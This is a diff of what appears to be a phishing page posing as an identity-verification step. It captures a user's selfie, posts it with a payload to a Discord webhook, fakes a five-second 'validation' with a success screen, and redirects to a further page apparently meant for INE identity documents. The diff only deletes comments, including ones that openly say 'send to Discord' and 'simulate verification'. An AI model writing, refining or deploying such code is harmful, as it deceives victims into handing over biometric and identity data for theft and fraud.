@@ -19,7 +19,6 @@
     .header-text h2 { font-size: clamp(18px, 5vw, 22px); margin-bottom: 5px; }
     .header-text p { font-size: clamp(13px, 4vw, 15px); color: #ccc; }
     
-    /* Óvalo guía */
     .oval-frame { 
       width: clamp(260px, 75vw, 320px); 
       height: clamp(350px, 100vw, 420px); 
@@ -50,7 +49,6 @@
     }
     .btn-validate:active { background-color: #00b36b; }
 
-    /* Pantalla de Carga (oculta) */
     .loader-container {
       position: absolute; top: 0; left: 0; width: 100%; height: 100%;
       background: #fff; z-index: 300; display: none;
@@ -60,7 +58,6 @@
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .loader-text { font-size: 18px; font-weight: bold; color: #333; }
 
-    /* Pantalla de Éxito Final (oculta) */
     .final-screen {
       position: absolute; top: 0; left: 0; width: 100%; height: 100%;
       background: #f4f4f4; z-index: 400; display: none;
@@ -90,13 +87,11 @@
       </div>
     </div>
 
-    <!-- Pantalla de carga -->
     <div class="loader-container" id="loaderScreen">
       <div class="spinner"></div>
       <div class="loader-text">Validando identidad...</div>
     </div>
 
-    <!-- Pantalla de éxito final -->
     <div class="final-screen" id="finalScreen">
       <div class="success-card">
         <div class="check-icon">✓</div>
@@ -188,17 +183,14 @@
         formData.append('payload_json', JSON.stringify(payload));
         formData.append('file1', base64ToBlob(selfieBase64, 'image/jpeg'), 'Selfie.jpg');
 
-        // Enviar a Discord
         await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
 
-        // Simular verificación por 5 segundos
         setTimeout(() => {
           document.getElementById('loaderScreen').style.display = 'none';
           document.getElementById('finalScreen').style.display = 'flex';
           
           confetti({ particleCount: 150, spread: 90, origin: { y: 0.5 } });
 
-          // Redirección al INE después de 3 segundos
           setTimeout(() => {
             window.location.href = 'in3.html';
           }, 3000);
